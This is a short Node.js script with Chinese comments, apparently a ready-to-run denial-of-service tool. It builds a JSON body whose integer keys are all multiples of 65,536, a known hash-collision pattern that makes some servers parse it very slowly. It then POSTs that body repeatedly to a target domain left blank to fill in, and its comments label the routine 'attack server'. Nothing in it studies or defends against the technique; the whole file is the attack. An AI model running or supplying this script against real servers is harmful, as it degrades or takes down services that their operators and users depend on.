const axios = require('axios')

const request = axios.create({
    baseURL: '', // 这里填写域名
    timeout: 600 * 1000,
    headers: {
    	'Content-Type': 'application/json;charset=UTF-8',
 	}
})

// http request 请求拦截器，通过这个，我们就可以把Cookie传到后台
request.interceptors.request.use(config => {
    return config
}, error => {
    const { response } = error
    console.log('config error')
    if (response) {
    	console.log(response.status)
    }
})

// http response 响应拦截器
request.interceptors.response.use(response => {
	console.log('response success')
    console.log(response.status)
}, error => {
	console.log('response error')
	const { response } = error
    if (response) {
    	console.log(response.status)
    }
})


const buildData = () => {
	let size = Math.pow(2, 16)
	let data = {}
	let maxKey = (size - 1) * size
	for (let key = 0; key <= maxKey; key += size) {
		data[key] = key
	}
	return data
}

const attack = (attack_num) => {
	let data = buildData()
	for (let i = 0; i < attack_num; i++) {
		request({
	      url: '/',
	      method: 'post',
	      data: JSON.stringify(data)
	    })
	}

	
}

// 攻击次数
const num = 10

// 攻击服务器
attack(num)